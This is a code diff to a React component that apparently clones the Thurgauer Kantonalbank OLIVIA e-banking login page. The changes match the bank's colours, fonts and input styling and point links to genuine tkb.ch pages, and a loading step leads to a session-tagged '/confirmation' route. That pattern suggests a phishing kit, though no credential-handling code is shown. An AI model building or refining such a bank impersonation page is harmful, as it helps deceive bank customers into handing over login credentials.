@@ -13,9 +13,8 @@ const GREEN_ACCENT = "#9fd32f";
 const TITLE_GREEN = "#005d38";
 const ERROR_RED = "#9c013c";
 const ERROR_BG = "#f9e6ed";
+const INPUT_BG = "#f7f6f6";
 const DIVIDER = "#82b613";
-
-type Lang = "de";
 
 const t = {
   pageTitle: "Thurgauer Kantonalbank – OLIVIA",
@@ -77,13 +76,12 @@ const FloatingInput = ({
     borderColor = GREEN_ACCENT;
     borderWidth = 2;
   } else if (showEye && hasValue) {
-    // password with value
     borderColor = GREEN_ACCENT;
     borderWidth = 2;
   }
 
-  const bg = isError ? ERROR_BG : "#fff";
-  const labelColor = isError ? ERROR_RED : "#6c6e70";
+  const bg = isError ? ERROR_BG : INPUT_BG;
+  const labelColor = isError ? ERROR_RED : floated ? GREEN : "#6c6e70";
   const inputType = showEye ? (reveal ? "text" : "password") : type;
 
   return (
@@ -200,7 +198,11 @@ const ChThurgauerKantonalbank = () => {
     setShowLoading(true);
   };
 
-  const quickLinks = [t.forgotPw, t.newDevice, t.block];
+  const quickLinks: { label: string; href: string; external: boolean }[] = [
+    { label: t.forgotPw, href: "#", external: false },
+    { label: t.newDevice, href: "#", external: false },
+    { label: t.block, href: "https://www.tkb.ch/olivia_sperren", external: true },
+  ];
 
   return (
     <>
@@ -210,7 +212,7 @@ const ChThurgauerKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen bg-white flex flex-col">
+      <div className="bg-white flex flex-col">
         {/* Header */}
         <header
           className="w-full"
@@ -232,15 +234,15 @@ const ChThurgauerKantonalbank = () => {
         </header>
 
         {/* Main */}
-        <main className="flex-1">
+        <main style={{ minHeight: "calc(100vh - 80px)" }}>
           <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 pt-8 md:pt-12">
             <h1
-              className="text-[24px] md:text-[28px] font-bold tracking-wide"
+              className="text-[24px] md:text-[28px] font-normal tracking-wide"
               style={{ color: TITLE_GREEN }}
             >
               {t.loginTitle}
             </h1>
-            <p className="mt-2 text-[14px]" style={{ color: "#3a3a3a" }}>
+            <p className="mt-2 text-[16px]" style={{ color: "#3a3a3a" }}>
               {t.credentialsLabel}
             </p>
 
@@ -288,16 +290,18 @@ const ChThurgauerKantonalbank = () => {
               </div>
 
               <div className="mt-8 space-y-3">
-                {quickLinks.map((label) => (
+                {quickLinks.map((l) => (
                   <a
-                    key={label}
-                    href="#"
-                    onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] underline"
+                    key={l.label}
+                    href={l.href}
+                    onClick={l.external ? undefined : (e) => e.preventDefault()}
+                    target={l.external ? "_blank" : undefined}
+                    rel={l.external ? "noopener noreferrer" : undefined}
+                    className="link-underline-grow inline-flex items-center gap-2 text-[15px] self-start"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
-                    {label}
+                    {l.label}
                   </a>
                 ))}
               </div>
@@ -315,20 +319,22 @@ const ChThurgauerKantonalbank = () => {
                 <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                   {t.card1Text}
                 </p>
-                <div className="mt-auto pt-6 space-y-2">
+                <div className="mt-auto pt-6 space-y-2 flex flex-col items-start">
                   <a
-                    href="#"
-                    onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] no-underline"
+                    href="https://www.tkb.ch/loginprozess-login"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="link-underline-grow inline-flex items-center gap-2 text-[15px]"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
                     {t.card1Link1}
                   </a>
                   <a
-                    href="#"
-                    onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] no-underline"
+                    href="https://www.tkb.ch/sicherheit"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="link-underline-grow inline-flex items-center gap-2 text-[15px]"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
@@ -347,11 +353,12 @@ const ChThurgauerKantonalbank = () => {
                 <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                   {t.card2Text}
                 </p>
-                <div className="mt-3">
+                <div className="mt-3 flex flex-col items-start">
                   <a
-                    href="#"
-                    onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] no-underline"
+                    href="https://www.tkb.ch/olivia"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="link-underline-grow inline-flex items-center gap-2 text-[15px]"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
@@ -373,10 +380,10 @@ const ChThurgauerKantonalbank = () => {
               className="h-[36px] object-contain"
             />
             <a
-              href="https://www.tkb.ch"
+              href="https://tkb.ch/"
               target="_blank"
               rel="noopener noreferrer"
-              className="text-[15px] font-bold no-underline"
+              className="link-underline-grow inline-block text-[15px] font-normal"
               style={{ color: GREEN }}
             >
               tkb.ch
